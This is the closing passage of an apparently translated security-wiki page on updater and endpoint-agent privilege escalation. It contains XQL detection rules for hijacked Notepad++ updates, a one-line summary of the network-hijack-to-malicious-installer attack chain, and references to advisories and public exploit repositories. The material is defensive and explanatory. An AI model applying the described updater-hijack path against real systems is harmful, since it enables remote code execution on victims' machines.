| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – το <code>gup.exe</code> εκκινεί ένα πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα μοτίβα γενικεύονται σε κάθε updater που αποδέχεται unsigned manifests ή δεν περιορίζει τους signers του installer—network hijack + malicious installer + BYO-signed sideloading οδηγούν σε remote code execution υπό το πρόσχημα «trusted» updates.

---
## Αναφορές
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
